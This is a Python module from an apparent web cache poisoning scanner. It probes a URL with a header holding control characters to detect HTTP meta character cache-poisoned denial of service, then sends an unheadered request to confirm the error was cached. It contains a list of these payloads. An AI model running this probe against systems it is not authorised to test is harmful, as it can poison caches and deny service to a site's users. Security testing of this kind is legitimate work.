#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Metachar Character (HMC)
https://cpdos.org/#HMC
"""

from modules.utils import logging, random

VULN_NAME = "HTTP Meta Character"

logger = logging.getLogger(__name__)

def check_meta_character(url, s, main_status_code, authent, meta_character):
    """Probe and Verify the server for a meta character vulnerability"""

    url = f"{url}{random.randrange(99)}"
    headers = {"X-Metachar-Header": meta_character}
    probe = s.get(
        url,
        headers=headers,
        timeout=10,
        verify=False,
        auth=authent,
        allow_redirects=False,
    )

    reason = ""
    if (
        probe.status_code in [400, 413, 500]
        and probe.status_code != main_status_code
    ):
        control = s.get(url, verify=False, timeout=10, auth=authent)
        if (
            control.status_code == probe.status_code
            and control.status_code != main_status_code
        ):
            reason = f"\033[34m{main_status_code} > {control.status_code}\033[0m"

    if reason:
        payload = f"PAYLOAD: {headers}"
        print(
            f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HMC | {url} | {reason} | {payload}"
        )

def HMC(url, s, main_status_code, authent):
    """Prepare the list of meta characters to check for"""

    meta_characters = [
        r"\n",
        r"\a",
        r"\r",
        r"\0",
        r"\b",
        r"\e",
        r"\v",
        r"\f",
        r"\u0000",
        "\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07metahttptest",
    ]
    for meta_character in meta_characters:
        check_meta_character(url, s, main_status_code, authent, meta_character)

        print(f" \033[34m {VULN_NAME} : {meta_character.encode(encoding='UTF-8')}\033[0m\r", end="")
        print("\033[K", end="")
